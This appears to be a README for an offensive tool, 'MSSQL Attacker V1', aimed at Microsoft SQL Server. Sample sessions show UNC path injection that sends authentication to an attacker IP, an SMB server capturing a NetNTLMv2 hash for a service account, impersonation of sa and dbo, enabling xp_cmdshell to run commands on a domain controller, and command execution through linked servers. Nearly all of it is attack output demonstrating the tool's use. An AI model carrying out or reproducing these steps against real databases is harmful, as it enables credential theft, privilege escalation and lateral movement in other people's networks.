# MSSQL-Attacker
Initial release of MSSQL database attack tool.
```d
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value:
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 1
[+] Logged in as: CORP1\user1
[-] User is NOT a member of sysadmin role

```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 2
Enter Attacker Machine IP: 192.168.00.000
[+] Request Sent to: 192.168.00.000
```

```c
# impacket-smbserver -smb2support share . 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.00.0,61898)
[*] AUTHENTICATE_MESSAGE (CORP1\sqlsvc,DC01)
[*] User DC01\sqlsvc authenticated successfully
[*] sqlsvc::CORP1:aaaaaaaaaaaaaaaa:fd06f750293156da55e662fed63e90d3:0101000000000000002a6de9be95d8017a4bcabd0f4e7ea100000000010010004c007900560044004e00610046007300030010004c007900560044004e006100460073000200100056005000440075006100550076007100040010005600500044007500610055007600710007000800002a6de9be95d80106000400020000000800300030000000000000000000000000300000d5b59bbba756823ee684e0822332d904a879a20075e09a14f9207e27158c27aa0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340039002e003100300039000000000000000000
[*] Closing down connection (192.168.00.0,61898)

```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 3
[+] Logins that can be impersonated: sa
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 4
[+] Logins that can be impersonated: sa
[+] Impersonation Success
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 5
Enter Database Name:msdb
[+] Impersonation As DBO Success
//
INPUT] Enter Value: 1
[+] Logged in as: sa
[+] User is a member of sysadmin role
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 6
[+] XP_CMDSHELL enabled sucessfully
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 7
[+] XP_CMDSHELL enabled sucessfully
Enter Command: whoami
corp1\sqlsvc

Enter Command: hostname
dc01

Enter Command: exit

```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 8
[+] Linked SQL server: APPSRV01
[+] Linked SQL server: DC01\SQLEXPRESS
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 9
Enter Linked Server: APPSRV01
[+] Linked Server Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)

```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 10
Enter Linked Server: APPSRV01
[+] Linked xp_cmdshell value_in_use: 1
[+] xp_cmdshell enabled
```

```c
                                [*] MSSQL Attacker V1 by Rikunj Sindhwad [*]

[1] Get Information                      [2] UNC PATH Injection          [3] Impersonation Check
[4] ImpersonateSA                        [5] Impersonate DBO             [6] Enable xp_cmdshell
[7] Shell_Access                         [8] Check LinkedServers         [9] Enumerate LinkedServer Version
[10] EnableLinkedServer_xp_cmdshell      [11] LinkedServer xp_cmdshell
[0] Exit Program

[INPUT] Enter Value: 11
Enter Linked Server: APPSRV01
[+] Linked xp_cmdshell value_in_use: 1
Enter Command: whoami
[+] Command Executed
```
